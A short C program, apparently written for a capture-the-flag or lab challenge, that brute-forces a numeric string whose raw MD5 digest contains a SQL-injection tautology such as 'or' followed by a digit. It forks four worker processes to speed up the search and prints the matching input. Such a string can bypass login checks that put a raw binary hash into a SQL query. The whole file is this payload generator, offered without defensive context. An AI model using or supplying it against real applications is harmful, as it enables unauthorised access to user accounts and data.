#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <openssl/md5.h>
#include <sys/types.h>
#include <unistd.h>

#define NULL_TER '\0'

int main() {
	MD5_CTX c;
	unsigned char digest[MD5_DIGEST_LENGTH+1];
	int rand1,rand2, rand3, rand4, rand5;
	char rand_buf[100];
	char* evil_hash;
	const char* evil_temp;
	char evil_str1[] = "'||'";
	char evil_str2[] = "'or'";
	char evil_str3[] = "'OR'";
	char evil_str4[] = "'Or'";
	char evil_str5[] = "'oR'";
	int pid;
	int seed;
	


	//produce child process
	fork();
	fork();
	//produce random seed for multiprocess
	pid = (int)getpid();
	seed = pid*pid*time(0);
	srand(seed);

	while(1){


	    //increase randomness of input string
		rand1 = rand();
		rand2 = rand();
		rand3 = rand();
		rand4 = rand();
		rand5 = rand();
		sprintf(rand_buf,"%d%d%d%d%d" ,rand1,rand2,rand3,rand4, rand5);

		MD5_Init(&c);
		MD5_Update(&c, rand_buf, strlen(rand_buf));
		MD5_Final(digest, &c);

		//keep string safe
		digest[MD5_DIGEST_LENGTH] = NULL_TER;


		evil_temp = (char*)digest;
		evil_hash = strstr(evil_temp, evil_str1);

		if(evil_hash == NULL)	evil_hash = strstr(evil_temp, evil_str2);
		if(evil_hash == NULL)	evil_hash = strstr(evil_temp, evil_str3);
		if(evil_hash == NULL)	evil_hash = strstr(evil_temp, evil_str4);
		if(evil_hash == NULL)	evil_hash = strstr(evil_temp, evil_str5);

		if(evil_hash != NULL) {
			if(evil_hash[4] > '0' && evil_hash[4] <= '9') {
				printf("input = %s\n", rand_buf);
				printf("evil_hash = %s\n", evil_temp);
				printf("pid = %d\n", (int)getpid());
				break;
			}
		}
	}



	return 0;
}